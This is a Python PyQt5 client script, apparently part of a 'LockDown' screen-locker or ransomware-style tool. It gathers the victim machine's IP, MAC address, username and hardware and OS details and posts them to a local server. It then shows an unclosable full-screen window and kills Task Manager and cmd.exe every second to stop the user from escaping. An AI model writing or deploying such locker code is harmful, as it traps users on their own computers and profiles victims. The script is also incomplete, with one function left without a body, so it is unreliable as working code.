from PyQt5 import uic, QtCore, QtWidgets
import cryptography.fernet
import requests
import platform
import socket
import base64
import random
import bcrypt
import psutil
import json
import uuid

# Fetch the server to get the properties
try:
    response = requests.get("http://localhost:4900/language_data")
    response.raise_for_status()  # Raise an exception for bad status codes
    data = response.json()
    print(data)
except requests.exceptions.RequestException as e:
    print(f"Error fetching data from server: {e}")
    exit(1)


def save_new_client():
    # Generate a key for the client


def report_client_to_server(client_token):
    # Get the IP address, Mac address, Username, CPU Info, Memory Info, Disk Info, OS Info
    try:
        # IP Address
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        # MAC Address
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8 * 6, 8)][::-1])

        # Username
        username = psutil.users()[0].name

        # CPU Info
        cpu_info = {
            'logical_cores': psutil.cpu_count(logical=True),
            'physical_cores': psutil.cpu_count(logical=False),
            'frequency': psutil.cpu_freq().current,
            'usage': psutil.cpu_percent(interval=1),
        }

        # Memory Info
        memory_info = {
            'total': psutil.virtual_memory().total,
            'available': psutil.virtual_memory().available,
            'used': psutil.virtual_memory().used,
            'percent': psutil.virtual_memory().percent,
        }

        # Disk Info
        disk_info = {
            'total': psutil.disk_usage('/').total,
            'used': psutil.disk_usage('/').used,
            'free': psutil.disk_usage('/').free,
            'percent': psutil.disk_usage('/').percent,
        }

        # OS Info
        os_info = {
            'system': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
            'architecture': platform.machine(),
        }

        # Create a dictionary to store all the information
        client_data = {
            'ip_address': ip_address,
            'mac_address': mac_address,
            'username': username,
            'cpu_info': cpu_info,
            'memory_info': memory_info,
            'disk_info': disk_info,
            'os_info': os_info,
        }

        # Send the data to the server
        response = requests.post("http://localhost:4900/client_data", json=client_data)
        response.raise_for_status()  # Raise an exception for bad status codes
        print("Client data sent successfully!")

    except Exception as e:
        print(f"Error collecting or sending client data: {e}")

# UI Class

class UnexitableWindow(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        uic.loadUi("templates/client.ui", self)  # Load your UI file

        # change the labelheader text according to the server.
        self.labelheader.setText("LockDown - " + "")
        self.setWindowFlags(QtCore.Qt.WindowStaysOnTopHint | QtCore.Qt.FramelessWindowHint)
        self.setAttribute(QtCore.Qt.WA_TranslucentBackground)
        self.showFullScreen()

        # Remove the close button
        self.setWindowFlags(self.windowFlags() & ~QtCore.Qt.WindowCloseButtonHint)

        # Set up timer to check for Task Manager
        self.taskmgr_check_timer = QtCore.QTimer(self)
        self.taskmgr_check_timer.timeout.connect(self.check_taskmgr)
        self.taskmgr_check_timer.start(1000)  # Check every 1 second
        self.terminal_check_timer = QtCore.QTimer(self)
        self.terminal_check_timer.timeout.connect(self.check_terminal)
        self.terminal_check_timer.start(1000)

    def closeEvent(self, event):
        # Override close event to prevent closing
        event.ignore()

    def check_taskmgr(self):
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() == 'taskmgr.exe':
                proc.kill()  # Terminate Task Manager

    def check_terminal(self):
        for proc in psutil.process_iter(['name']):
            # Get the OS name if equals to windows do it.

            if proc.info['name'].lower() == 'cmd.exe':
                proc.kill()


if __name__ == '__main__':
    app = QtWidgets.QApplication([])
    window = UnexitableWindow()
    window.show()  # Show the main window
    app.exec_()  # Start the application's event loop